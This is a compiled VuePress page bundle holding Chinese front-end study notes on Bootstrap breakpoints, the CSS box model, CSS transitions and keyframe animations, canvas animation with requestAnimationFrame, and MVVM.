"),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[t._v("/* 超小屏幕（手机，小于 768px） */\n/* 没有任何媒体查询相关的代码，因为这在 Bootstrap 中是默认的（还记得 Bootstrap 是移动设备优先的吗？） */\n\n/* 小屏幕（平板，大于等于 768px） */\n@media (min-width: @screen-sm-min) { ... }\n\n/* 中等屏幕（桌面显示器，大于等于 992px） */\n@media (min-width: @screen-md-min) { ... }\n\n/* 大屏幕（大桌面显示器，大于等于 1200px） */\n@media (min-width: @screen-lg-min) { ... }\n")])])]),a("h2",{attrs:{id:"tcp-ip-协议簇"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#tcp-ip-协议簇"}},[t._v("#")]),t._v(" TCP/IP 协议簇")]),t._v(" "),a("p",[t._v("四层模型：")]),t._v(" "),a("ol",[a("li",[t._v("应用层")]),t._v(" "),a("li",[t._v("传输侧")]),t._v(" "),a("li",[t._v("网络层")]),t._v(" "),a("li",[t._v("数据链路层")])]),t._v(" "),a("h2",{attrs:{id:"盒子模型"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#盒子模型"}},[t._v("#")]),t._v(" 盒子模型")]),t._v(" "),a("p",[t._v("盒子模型由外到内包含几个要素")]),t._v(" "),a("ol",[a("li",[t._v("margin")]),t._v(" "),a("li",[t._v("border")]),t._v(" "),a("li",[t._v("padding")]),t._v(" "),a("li",[t._v("content")])]),t._v(" "),a("p",[t._v("盒子模型又分为"),a("strong",[t._v("标准盒子模型")]),t._v("和"),a("strong",[t._v("IE盒子模型")]),t._v("。盒子模型的区别就在于他们的内容宽度（content-width）的不同，也就是 "),a("strong",[t._v("width 属性包含的内容不同")]),t._v("。")]),t._v(" "),a("p",[t._v("标准盒子模型的 width = content")]),t._v(" "),a("p",[t._v("怪异盒子模型的 width = content + padding + border")]),t._v(" "),a("p",[t._v("使用"),a("code",[t._v("box-sizing:content-box")]),t._v("(默认)时，这个容器默认使用 标准盒子模型")]),t._v(" "),a("p",[t._v("使用 "),a("code",[t._v("box-sizing: border-box")]),t._v(" 后，容器使用 IE盒子模型")]),t._v(" "),a("h2",{attrs:{id:"css3动画"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#css3动画"}},[t._v("#")]),t._v(" CSS3动画")]),t._v(" "),a("p",[t._v("CSS 动画分为："),a("strong",[t._v("过渡动画")]),t._v(" 和 "),a("strong",[t._v("帧动画")])]),t._v(" "),a("h3",{attrs:{id:"过渡动画"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#过渡动画"}},[t._v("#")]),t._v(" 过渡动画")]),t._v(" "),a("p",[t._v("是使用最为广泛的动画，简单来说就是一个"),a("strong",[t._v("元素从一个状态转变为另个状态时")]),t._v("，系统自动创建的补间动画。")]),t._v(" "),a("p",[t._v("transition 有四个属性")]),t._v(" "),a("ul",[a("li",[a("p",[t._v("transition-property 用来规定某个CSS属性可以进行过渡，我们可以设置为all")])]),t._v(" "),a("li",[a("p",[t._v("transition-duration 规定过渡的时间")])]),t._v(" "),a("li",[a("p",[t._v("transition-timing-function 过渡动画的时间曲线")])]),t._v(" "),a("li",[a("p",[t._v("transition-delay 规定动画的延迟")])])]),t._v(" "),a("p",[t._v("实现代码：")]),t._v(" "),a("div",{staticClass:"language-css extra-class"},[a("pre",{pre:!0,attrs:{class:"language-css"}},[a("code",[a("span",{pre:!0,attrs:{class:"token selector"}},[t._v("div")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n\t"),a("span",{pre:!0,attrs:{class:"token property"}},[t._v("width")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v("100px"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n\t"),a("span",{pre:!0,attrs:{class:"token property"}},[t._v("height")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v("100px"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n\t"),a("span",{pre:!0,attrs:{class:"token property"}},[t._v("transition")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" width 1s linear"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v(" // transition 是上述的四个属性的缩写，不设置的属性可以忽略\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n\n"),a("span",{pre:!0,attrs:{class:"token selector"}},[t._v("div:hover")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n    "),a("span",{pre:!0,attrs:{class:"token property"}},[t._v("width")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v("300px"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("  // 鼠标经过div时，width变为300，我们可以看到流畅的过渡动画\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n")])])]),a("h3",{attrs:{id:"帧动画"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#帧动画"}},[t._v("#")]),t._v(" 帧动画")]),t._v(" "),a("p",[t._v("帧动画一般用于比较复杂的CSS动画，而非简单的线性转变")]),t._v(" "),a("p",[t._v("使用帧动画我们需要先定义一个"),a("strong",[t._v("关键帧")]),a("code",[t._v("keyframe")]),t._v(",如果该动画只有两个关键帧，那么可以使用from/to,若有多个关键帧，则可以使用百分比的形式。")]),t._v(" "),a("div",{staticClass:"language-css extra-class"},[a("pre",{pre:!0,attrs:{class:"language-css"}},[a("code",[t._v("// from-to 形式\n"),a("span",{pre:!0,attrs:{class:"token atrule"}},[a("span",{pre:!0,attrs:{class:"token rule"}},[t._v("@keyframes")]),t._v(" my-animation")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n  "),a("span",{pre:!0,attrs:{class:"token selector"}},[t._v("from")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n    "),a("span",{pre:!0,attrs:{class:"token property"}},[t._v("width")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v("100px"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n    "),a("span",{pre:!0,attrs:{class:"token property"}},[t._v("height")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v("100px"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n    "),a("span",{pre:!0,attrs:{class:"token property"}},[t._v("background")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v("red"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n  "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n  "),a("span",{pre:!0,attrs:{class:"token selector"}},[t._v("to")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n    "),a("span",{pre:!0,attrs:{class:"token property"}},[t._v("width")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v("200px"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n    "),a("span",{pre:!0,attrs:{class:"token property"}},[t._v("height")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v("200px"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n    "),a("span",{pre:!0,attrs:{class:"token property"}},[t._v("background")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v("yellow"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n  "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n百分百的形式\n"),a("span",{pre:!0,attrs:{class:"token atrule"}},[a("span",{pre:!0,attrs:{class:"token rule"}},[t._v("@keyframes")]),t._v(" my-animation")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n  "),a("span",{pre:!0,attrs:{class:"token selector"}},[t._v("0%")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n    "),a("span",{pre:!0,attrs:{class:"token property"}},[t._v("width")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v("100px"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n    "),a("span",{pre:!0,attrs:{class:"token property"}},[t._v("height")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v("100px"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n    "),a("span",{pre:!0,attrs:{class:"token property"}},[t._v("background")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v("red"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n  "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n  "),a("span",{pre:!0,attrs:{class:"token selector"}},[t._v("20%")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n\t\t"),a("span",{pre:!0,attrs:{class:"token property"}},[t._v("width")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v("300px"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n  "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n  "),a("span",{pre:!0,attrs:{class:"token selector"}},[t._v("40%")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n\t\t"),a("span",{pre:!0,attrs:{class:"token property"}},[t._v("height")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v("300px"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n  "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n  "),a("span",{pre:!0,attrs:{class:"token selector"}},[t._v("80%")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n\t\t"),a("span",{pre:!0,attrs:{class:"token property"}},[t._v("background")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v("yellow"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n  "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n")])])]),a("p",[t._v("定义关键帧之后我们需要用"),a("code",[t._v("animation")]),t._v("属性进行控制")]),t._v(" "),a("p",[a("code",[t._v("animation")]),t._v(" 的属性基本和"),a("code",[t._v("transition")]),t._v("没有差别，但是多出了几个属性")]),t._v(" "),a("div",{staticClass:"language-css extra-class"},[a("pre",{pre:!0,attrs:{class:"language-css"}},[a("code",[t._v("// 以下同 transition\n"),a("span",{pre:!0,attrs:{class:"token property"}},[t._v("animation-name")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" my-animation"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token property"}},[t._v("animation-duration")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" 5s"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token property"}},[t._v("animation-timing-function")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" linear"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token property"}},[t._v("animation-delay")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" 2s"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n// 以下为多出的部分\n"),a("span",{pre:!0,attrs:{class:"token property"}},[t._v("animation-iteration-count")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" infinite"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v(" // 动画播放次数\n"),a("span",{pre:!0,attrs:{class:"token property"}},[t._v("animation-direction")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" alternate"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v(" // 是否逆向播放\n"),a("span",{pre:!0,attrs:{class:"token property"}},[t._v("animation-play-state")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" running"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v(" // 暂停功能\n"),a("span",{pre:!0,attrs:{class:"token property"}},[t._v("animation-fill-mode")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v("forwards"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v(" // 动画结束时，将样式作用于该元素\n")])])]),a("p",[t._v("那么我们引用以上动画还可以这样")]),t._v(" "),a("div",{staticClass:"language-css extra-class"},[a("pre",{pre:!0,attrs:{class:"language-css"}},[a("code",[a("span",{pre:!0,attrs:{class:"token property"}},[t._v("animation")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" my-animation 5s linear"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n")])])]),a("p",[t._v("我们可以发现，帧动画比过渡动画强大许多，但是代码量也大大增加了，所以能使用过渡动画尽量不使用帧动画。")]),t._v(" "),a("h2",{attrs:{id:"canvas动画"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#canvas动画"}},[t._v("#")]),t._v(" canvas动画")]),t._v(" "),a("p",[t._v("canvas 是 html5 提供的绘图功能。基础的canvas操作不再讲解，直接说canvas生成动画的原理。")]),t._v(" "),a("p",[t._v("本质：就是将画板"),a("strong",[t._v("不断擦除，不断重绘的过程")]),t._v("，不断重复这个过程，画面自然就动起来了。其实就是模拟现实动画制作的本质。")]),t._v(" "),a("p",[t._v("所以我们可以定义一个 animation 函数")]),t._v(" "),a("div",{staticClass:"language-javascript extra-class"},[a("pre",{pre:!0,attrs:{class:"language-javascript"}},[a("code",[a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("const")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token function-variable function"}},[t._v("animation")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token parameter"}},[t._v("fn")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=>")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n\tcontent"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("clearRect")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("0")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("0")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),a("span",{pre:!0,attrs:{class:"token constant"}},[t._v("WIDTH")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),a("span",{pre:!0,attrs:{class:"token constant"}},[t._v("HEIGHT")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("// 此处的WIDTH和HEIGHT指canvas的宽高")]),t._v("\n\t"),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("requestAnimationFrame")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("fn"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n")])])]),a("p",[t._v("这里要说一下"),a("code",[t._v("requestAnimationFrame")]),t._v("这个API")]),t._v(" "),a("p",[t._v("众所周知，"),a("code",[t._v("settimeout")]),t._v("和"),a("code",[t._v("setInterval")]),t._v("的计时功能不能在所有情况下实现精确计时（原因不在这里阐述，简单来说是 event loop 被占用）")]),t._v(" "),a("p",[t._v("而"),a("code",[t._v("requestAnimationFrame")]),t._v("可以精确地，符合人眼刷新频率地执行回调函数（也就是常说的60帧每秒）。")]),t._v(" "),a("p",[t._v("这种原理让"),a("code",[t._v("requestAnimationFrame")]),t._v("在制作动画上有了得天独厚的优势：")]),t._v(" "),a("ol",[a("li",[t._v("自带节流")]),t._v(" "),a("li",[t._v("CPU 的精确使用")]),t._v(" "),a("li",[t._v("符合人眼视觉停留效应")])]),t._v(" "),a("h2",{attrs:{id:"bfc"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#bfc"}},[t._v("#")]),t._v(" BFC")]),t._v(" "),a("h2",{attrs:{id:"浏览器有哪些线程"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#浏览器有哪些线程"}},[t._v("#")]),t._v(" 浏览器有哪些线程")]),t._v(" "),a("p",[t._v("https://imweb.io/topic/58e3bfa845e5c13468f567d5")]),t._v(" "),a("h2",{attrs:{id:"什么是mvvm"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#什么是mvvm"}},[t._v("#")]),t._v(" 什么是MVVM")]),t._v(" "),a("p",[t._v("MVVM 是近年发展起来的概念。")]),t._v(" "),a("p",[t._v("M 指 Model 也就是数据模型，通常是本地的 json 数据或后端返回的data数据。")]),t._v(" "),a("p",[t._v("V 指 View 视图，也就是显示界面，HTML 和 CSS")]),t._v(" "),a("p",[t._v("VM 指由开发人员内部封装好的视图数据层。在原生的 js 中，我们需要手动地去操作 DOM，更新DOM的数据或视图。而现在将视图和数据之间的操作被封装在了 VM 层，我们"),a("strong",[t._v("只需要去提供数据")]),t._v("，经过VM的转化，数据会自动展示在视图层。也就是说我们绕开了最为繁琐复杂的操作 DOM 的步骤，"),a("strong",[t._v("解耦了数据层和视图层")]),t._v("，这对现代前端开发是最重要的一步。")]),t._v(" "),a("h2",{attrs:{id:"双向绑定的实现"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#双向绑定的实现"}},[t._v("#")]),t._v(" 双向绑定的实现")])])}),[],!1,null,null,null);s.default=e.exports}}]);